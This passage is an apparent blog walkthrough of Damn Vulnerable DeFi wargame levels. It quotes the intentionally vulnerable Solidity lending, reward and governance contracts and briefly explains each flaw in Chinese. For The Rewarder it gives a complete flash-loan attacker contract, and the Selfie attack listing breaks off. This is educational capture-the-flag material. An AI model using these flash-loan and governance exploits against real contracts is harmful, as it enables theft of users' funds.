&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TrusterLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line"></span><br><span class="line">    constructor (address tokenAddress) &#123;</span><br><span class="line">        damnValuableToken = IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 borrowAmount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(borrower, borrowAmount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-2"><a href="#Analyse-2" class="headerlink" title="Analyse"></a>Analyse</h2><p>要求是拿走池子中的所有token,我们是无法直接转走所有代币的，但是flashloan中可以进行调用指定合约，那么如果我们调用erc20的approve那么是不是就可以让flashloan去approve我们的地址了？那么我们就会被授权了，然后转走所有的钱就可以了。</p><h1 id="0x04Side-entrance"><a href="#0x04Side-entrance" class="headerlink" title="0x04Side entrance"></a>0x04Side entrance</h1><h2 id="Request-3"><a href="#Request-3" class="headerlink" title="Request"></a>Request</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.</span><br><span class="line"></span><br><span class="line">This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</span><br><span class="line"></span><br><span class="line">You must take all ETH from the lending pool.</span><br></pre></td></tr></table></figure><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amountToWithdraw = balances[msg.sender];</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        payable(msg.sender).sendValue(amountToWithdraw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;= amount, &quot;Not enough ETH in balance&quot;);</span><br><span class="line">        </span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h2><p>我们用合约借钱，然后回调时存入目标合约，然后闪贷完成，取钱就可以了。</p><h1 id="0x05-The-reward"><a href="#0x05-The-reward" class="headerlink" title="0x05 The reward"></a>0x05 The reward</h1><h2 id="Request-4"><a href="#Request-4" class="headerlink" title="Request"></a>Request</h2><p>There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.</p><p>Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!</p><p>You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.</p><p>Oh, by the way, rumours say a new pool has just landed on mainnet. Isn’t it offering DVT tokens in flash loans?</p><h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><p>RewardToken.sol”; DamnValuableToken.sol”; AccountingToken.sol”;</p><p>这三个合约没有太大的作用</p><p><a href="https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/the-rewarder">三个合约代码</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./RewardToken.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableToken.sol&quot;;</span><br><span class="line">import &quot;./AccountingToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title TheRewarderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract TheRewarderPool &#123;</span><br><span class="line"></span><br><span class="line">    // Minimum duration of each round of rewards in seconds</span><br><span class="line">    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;</span><br><span class="line"></span><br><span class="line">    uint256 public lastSnapshotIdForRewards;</span><br><span class="line">    uint256 public lastRecordedSnapshotTimestamp;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public lastRewardTimestamps;</span><br><span class="line"></span><br><span class="line">    // Token deposited into the pool by users</span><br><span class="line">    DamnValuableToken public immutable liquidityToken;</span><br><span class="line"></span><br><span class="line">    // Token used for internal accounting and snapshots</span><br><span class="line">    // Pegged 1:1 with the liquidity token</span><br><span class="line">    AccountingToken public accToken;</span><br><span class="line">    </span><br><span class="line">    // Token in which rewards are issued</span><br><span class="line">    RewardToken public immutable rewardToken;</span><br><span class="line"></span><br><span class="line">    // Track number of rounds</span><br><span class="line">    uint256 public roundNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress) &#123;</span><br><span class="line">        // Assuming all three tokens have 18 decimals</span><br><span class="line">        liquidityToken = DamnValuableToken(tokenAddress);</span><br><span class="line">        accToken = new AccountingToken();</span><br><span class="line">        rewardToken = new RewardToken();</span><br><span class="line"></span><br><span class="line">        _recordSnapshot();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @notice sender must have approved `amountToDeposit` liquidity tokens in advance</span><br><span class="line">     */</span><br><span class="line">    function deposit(uint256 amountToDeposit) external &#123;</span><br><span class="line">        require(amountToDeposit &gt; 0, &quot;Must deposit tokens&quot;);</span><br><span class="line">        </span><br><span class="line">        accToken.mint(msg.sender, amountToDeposit);</span><br><span class="line">        distributeRewards();</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amountToWithdraw) external &#123;</span><br><span class="line">        accToken.burn(msg.sender, amountToWithdraw);</span><br><span class="line">        require(liquidityToken.transfer(msg.sender, amountToWithdraw));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function distributeRewards() public returns (uint256) &#123;</span><br><span class="line">        uint256 rewards = 0;</span><br><span class="line"></span><br><span class="line">        if(isNewRewardsRound()) &#123;</span><br><span class="line">            _recordSnapshot();</span><br><span class="line">        &#125;        </span><br><span class="line">        </span><br><span class="line">        uint256 totalDeposits = accToken.totalSupplyAt(lastSnapshotIdForRewards);</span><br><span class="line">        uint256 amountDeposited = accToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);</span><br><span class="line"></span><br><span class="line">        if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123;</span><br><span class="line">            rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;</span><br><span class="line"></span><br><span class="line">            if(rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123;</span><br><span class="line">                rewardToken.mint(msg.sender, rewards);</span><br><span class="line">                lastRewardTimestamps[msg.sender] = block.timestamp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return rewards;     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _recordSnapshot() private &#123;</span><br><span class="line">        lastSnapshotIdForRewards = accToken.snapshot();</span><br><span class="line">        lastRecordedSnapshotTimestamp = block.timestamp;</span><br><span class="line">        roundNumber++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _hasRetrievedReward(address account) private view returns (bool) &#123;</span><br><span class="line">        return (</span><br><span class="line">            lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp;</span><br><span class="line">            lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNewRewardsRound() public view returns (bool) &#123;</span><br><span class="line">        return block.timestamp &gt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-4"><a href="#Analyse-4" class="headerlink" title="Analyse"></a>Analyse</h2><p>题目要求就是让我们分配得到的奖励最大，意思就是让我们多存点钱，同时合约也提供了闪电贷，那么我们就可以贷款存钱，然后获得最大份额的奖励，然后在还钱给闪电贷，完成闪贷攻击。</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">interface DamnValuableToken&#123;</span><br><span class="line">    function approve(address,uint)external;</span><br><span class="line">    function transfer(address,uint)external;</span><br><span class="line">&#125;</span><br><span class="line">interface FlashLoanerPool&#123;</span><br><span class="line">    function flashLoan(uint) external;</span><br><span class="line">&#125;</span><br><span class="line">interface TheRewarderPool&#123;</span><br><span class="line">    function deposit(uint) external;</span><br><span class="line">    function withdraw(uint) external;</span><br><span class="line">&#125;</span><br><span class="line">interface RewardToken&#123;</span><br><span class="line">    function transfer(address,uint)external;</span><br><span class="line">    function balanceOf(address)external returns(uint);</span><br><span class="line">&#125;</span><br><span class="line">contract RewarderAttacker &#123;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken public  damnValuableToken;</span><br><span class="line">    FlashLoanerPool public  flashLoanpool;</span><br><span class="line">    TheRewarderPool public  theRewarderPool;</span><br><span class="line">    RewardToken public  rewardToken;</span><br><span class="line">    address public attacker;</span><br><span class="line"></span><br><span class="line">    constructor (address DVT, address flashLoanPool, address rewarderPool, address rewardTokenadd, address myaddress) &#123;</span><br><span class="line">        damnValuableToken = DamnValuableToken(DVT);</span><br><span class="line">        theRewarderPool = TheRewarderPool(rewarderPool);</span><br><span class="line">        flashLoanpool = FlashLoanerPool(flashLoanPool);</span><br><span class="line">        attacker = myaddress;</span><br><span class="line">        rewardToken = RewardToken(rewardTokenadd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) public &#123;</span><br><span class="line">        flashLoanpool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Take a flash loan of DVT, deposit to rewarder pool, call distributeRewards and collect reward, withdraw DVT</span><br><span class="line">    // send reward token to the attacker, return DVT</span><br><span class="line">    function receiveFlashLoan(uint256 amount) public &#123;</span><br><span class="line">        damnValuableToken.approve(address(theRewarderPool), amount);</span><br><span class="line">        theRewarderPool.deposit(amount);</span><br><span class="line">        theRewarderPool.withdraw(amount);</span><br><span class="line">        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));</span><br><span class="line">        damnValuableToken.transfer(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x06Selfie"><a href="#0x06Selfie" class="headerlink" title="0x06Selfie"></a>0x06Selfie</h1><h2 id="Request-5"><a href="#Request-5" class="headerlink" title="Request"></a>Request</h2><p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p><p>Wow, and it even includes a really fancy governance mechanism to control it.</p><p>What could go wrong, right ?</p><p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p><h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><h3 id="SelfiePool"><a href="#SelfiePool" class="headerlink" title="SelfiePool"></a>SelfiePool</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;./SimpleGovernance.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SelfiePool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SelfiePool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    ERC20Snapshot public token;</span><br><span class="line">    SimpleGovernance public governance;</span><br><span class="line"></span><br><span class="line">    event FundsDrained(address indexed receiver, uint256 amount);</span><br><span class="line"></span><br><span class="line">    modifier onlyGovernance() &#123;</span><br><span class="line">        require(msg.sender == address(governance), &quot;Only governance can execute this action&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress, address governanceAddress) &#123;</span><br><span class="line">        token = ERC20Snapshot(tokenAddress);</span><br><span class="line">        governance = SimpleGovernance(governanceAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = token.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        token.transfer(msg.sender, borrowAmount);        </span><br><span class="line">        </span><br><span class="line">        require(msg.sender.isContract(), &quot;Sender must be a deployed contract&quot;);</span><br><span class="line">        msg.sender.functionCall(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveTokens(address,uint256)&quot;,</span><br><span class="line">                address(token),</span><br><span class="line">                borrowAmount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = token.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#x27;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function drainAllFunds(address receiver) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(this));</span><br><span class="line">        token.transfer(receiver, amount);</span><br><span class="line">        </span><br><span class="line">        emit FundsDrained(receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SimpleGovernance"><a href="#SimpleGovernance" class="headerlink" title="SimpleGovernance"></a>SimpleGovernance</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SimpleGovernance</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SimpleGovernance &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line">    </span><br><span class="line">    struct GovernanceAction &#123;</span><br><span class="line">        address receiver;</span><br><span class="line">        bytes data;</span><br><span class="line">        uint256 weiAmount;</span><br><span class="line">        uint256 proposedAt;</span><br><span class="line">        uint256 executedAt;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    DamnValuableTokenSnapshot public governanceToken;</span><br><span class="line"></span><br><span class="line">    mapping(uint256 =&gt; GovernanceAction) public actions;</span><br><span class="line">    uint256 private actionCounter;</span><br><span class="line">    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;</span><br><span class="line"></span><br><span class="line">    event ActionQueued(uint256 actionId, address indexed caller);</span><br><span class="line">    event ActionExecuted(uint256 actionId, address indexed caller);</span><br><span class="line"></span><br><span class="line">    constructor(address governanceTokenAddress) &#123;</span><br><span class="line">        require(governanceTokenAddress != address(0), &quot;Governance token cannot be zero address&quot;);</span><br><span class="line">        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);</span><br><span class="line">        actionCounter = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) &#123;</span><br><span class="line">        require(_hasEnoughVotes(msg.sender), &quot;Not enough votes to propose an action&quot;);</span><br><span class="line">        require(receiver != address(this), &quot;Cannot queue actions that affect Governance&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 actionId = actionCounter;</span><br><span class="line"></span><br><span class="line">        GovernanceAction storage actionToQueue = actions[actionId];</span><br><span class="line">        actionToQueue.receiver = receiver;</span><br><span class="line">        actionToQueue.weiAmount = weiAmount;</span><br><span class="line">        actionToQueue.data = data;</span><br><span class="line">        actionToQueue.proposedAt = block.timestamp;</span><br><span class="line"></span><br><span class="line">        actionCounter++;</span><br><span class="line"></span><br><span class="line">        emit ActionQueued(actionId, msg.sender);</span><br><span class="line">        return actionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeAction(uint256 actionId) external payable &#123;</span><br><span class="line">        require(_canBeExecuted(actionId), &quot;Cannot execute this action&quot;);</span><br><span class="line">        </span><br><span class="line">        GovernanceAction storage actionToExecute = actions[actionId];</span><br><span class="line">        actionToExecute.executedAt = block.timestamp;</span><br><span class="line"></span><br><span class="line">        actionToExecute.receiver.functionCallWithValue(</span><br><span class="line">            actionToExecute.data,</span><br><span class="line">            actionToExecute.weiAmount</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit ActionExecuted(actionId, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionDelay() public view returns (uint256) &#123;</span><br><span class="line">        return ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev an action can only be executed if:</span><br><span class="line">     * 1) it&#x27;s never been executed before and</span><br><span class="line">     * 2) enough time has passed since it was first proposed</span><br><span class="line">     */</span><br><span class="line">    function _canBeExecuted(uint256 actionId) private view returns (bool) &#123;</span><br><span class="line">        GovernanceAction memory actionToExecute = actions[actionId];</span><br><span class="line">        return (</span><br><span class="line">            actionToExecute.executedAt == 0 &amp;&amp;</span><br><span class="line">            (block.timestamp - actionToExecute.proposedAt &gt;= ACTION_DELAY_IN_SECONDS)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _hasEnoughVotes(address account) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);</span><br><span class="line">        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">        return balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Analyse-5"><a href="#Analyse-5" class="headerlink" title="Analyse"></a>Analyse</h2><p>这一题也没啥，就是需要需要调用SelfiePool合约中的drainAllFunds函数，转走所有的钱就可以了，但是函数要求只能由SimpleGovernance合约调用，而SimpleGovernance调用需要先queue然后execute,而queue需要msg.sender的token大于总资产的一半，那么我们可以闪贷，<a href="%E5%A4%A7%E4%BD%AC%E5%8D%9A%E5%AE%A2%E8%BF%99%E6%A0%B7%E8%AF%B4%E7%9A%84%EF%BC%9A%E6%88%91%E6%89%BE%E4%B8%8D%E5%88%B0ERC20snapshot%E7%9A%84%E6%BA%90%E4%BB%A3%E7%A0%81">但是在此之前要先调用token的snapshot()函数，否则再balance将会返回值0.</a></p><p>然后就完成合约了。</p><h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 